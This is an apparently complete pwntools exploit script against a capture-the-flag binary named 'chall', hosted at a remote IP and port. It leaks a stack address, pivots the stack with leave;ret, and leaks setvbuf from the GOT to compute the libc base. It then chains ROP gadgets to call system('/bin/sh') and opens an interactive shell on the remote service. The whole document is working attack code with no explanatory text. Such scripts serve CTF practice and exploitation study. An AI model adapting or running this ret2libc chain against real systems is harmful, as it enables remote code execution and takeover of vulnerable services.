from pwn import *

BINARY = "chall"
LIBC = "libc.so.6"

context.binary = BINARY
elf = context.binary
rop = ROP(elf)
libc = ELF(LIBC)

# p = elf.process()
p = remote("34.76.206.46", 10004)

p.sendlineafter(b"Enter a number: ", b"3")

p.recvuntil(b"the number: ")
leak = int(p.recvline().strip())
log.info(f"buffer address -> {hex(leak)}")
log.info(f"hidden level -> {hex(elf.symbols['hidden_level'])}")
log.info(f"setvbuf got -> {hex(elf.got['setvbuf'])}")

payload = flat(
    p64(0),
    p64(rop.find_gadget(["pop rdi", "ret"]).address),
    p64(-0x21524111, sign="signed"),
    p64(elf.symbols["hidden_level"])
)
p.sendlineafter(b"first input please: ", payload)

payload = cyclic(0x70)
payload += p64(leak)
payload += p64(rop.find_gadget(["leave", "ret"]).address)

p.sendlineafter(b"second input please: ", payload)

log.info(f"address for write to print -> {hex(leak+0x140-0x70+0x30)}")

payload =  cyclic(88)
payload += p64(elf.got["setvbuf"])
payload += cyclic(0x70-len(payload))
payload += p64(leak+0x30)
# payload += p64(rop.find_gadget(["mov rsi, qword ptr [rbp - 0x30]", "ret"]).address)
payload += p64(0x400948)
payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(2)
payload += p64(rop.find_gadget(["pop rdx", "ret"]).address)
payload += p64(8)
payload += p64(elf.plt["write"])
payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(0xdeadbeef)
payload += p64(elf.symbols["hidden_level"])

p.sendlineafter(b"unlock the hidden door:\n", payload)

setvbuf_leak = p.recvuntil(b"Oooh!")[:-5]
setvbuf_leak = u64(setvbuf_leak.ljust(8, b'\x00'))

log.info(f"setvbuf leak -> {hex(setvbuf_leak)}")
libc_base = setvbuf_leak - libc.symbols["setvbuf"]
log.info(f"libc base -> {hex(libc_base)}")
libc.address = libc_base

payload =  cyclic(0x70+8)
payload += p64(rop.find_gadget(["pop rdi", "ret"]).address)
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(libc.symbols["system"])

p.sendlineafter(b"unlock the hidden door:\n", payload)

p.interactive()
p.close()